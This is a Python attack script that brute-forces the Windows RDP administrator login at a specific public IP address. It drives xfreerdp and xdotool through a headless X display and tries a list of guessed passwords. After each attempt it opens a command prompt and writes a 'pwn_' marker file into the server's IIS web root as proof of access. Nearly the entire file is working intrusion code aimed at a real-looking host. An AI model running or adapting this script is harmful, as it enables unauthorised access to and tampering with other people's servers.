import subprocess, time, os, sys

# Kill old
subprocess.run(["pkill", "-9", "Xvfb"], capture_output=True)
subprocess.run(["pkill", "-9", "xfreerdp"], capture_output=True)
time.sleep(2)

# Start Xvfb
subprocess.Popen(["Xvfb", ":99", "-screen", "0", "1280x800x24"])
time.sleep(2)
os.environ["DISPLAY"] = ":99"

passwords = [
    "silverplus", "silverplus123", "silverplus888", "Silverplus",
    "yunsuo", "yunlock", "admin", "admin123", "silver", 
    "100206", "123456", "password"
]

for pw in passwords:
    print("Trying:", pw)
    
    # Start xfreerdp
    proc = subprocess.Popen(
        ["xfreerdp", "/v:113.113.81.253", "/u:administrator", "/p:100206",
         "/cert-ignore", "+sec-nla", "/size:1024x768", "/network:lan"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(14)
    
    # Find window and send keys
    r = subprocess.run(["xdotool", "search", "--name", "FreeRDP"], 
                       capture_output=True, text=True, timeout=5)
    wid = r.stdout.strip().split("\n")[0] if r.stdout.strip() else ""
    
    if wid:
        subprocess.run(["xdotool", "windowactivate", wid], timeout=3)
        time.sleep(0.3)
        subprocess.run(["xdotool", "type", "--window", wid, pw], timeout=5)
        time.sleep(0.2)
        subprocess.run(["xdotool", "key", "--window", wid, "Return"], timeout=3)
        time.sleep(4)
        
        # Test: Win+R cmd whoami
        subprocess.run(["xdotool", "key", "--window", wid, "Super+r"], timeout=3)
        time.sleep(0.5)
        subprocess.run(["xdotool", "type", "--window", wid, "cmd"], timeout=3)
        time.sleep(0.2)
        subprocess.run(["xdotool", "key", "--window", wid, "Return"], timeout=3)
        time.sleep(1.5)
        
        marker = pw.replace("/", "_")
        cmd = "echo " + marker + " > C:\\inetpub\\wwwroot\\pwn_" + marker + ".txt"
        subprocess.run(["xdotool", "type", "--window", wid, cmd], timeout=5)
        time.sleep(0.2)
        subprocess.run(["xdotool", "key", "--window", wid, "Return"], timeout=3)
        time.sleep(3)
    else:
        print("  No window found")
    
    proc.terminate()
    time.sleep(1)
    subprocess.run(["pkill", "-9", "xfreerdp"], capture_output=True)
    time.sleep(1)

print("All passwords tried")
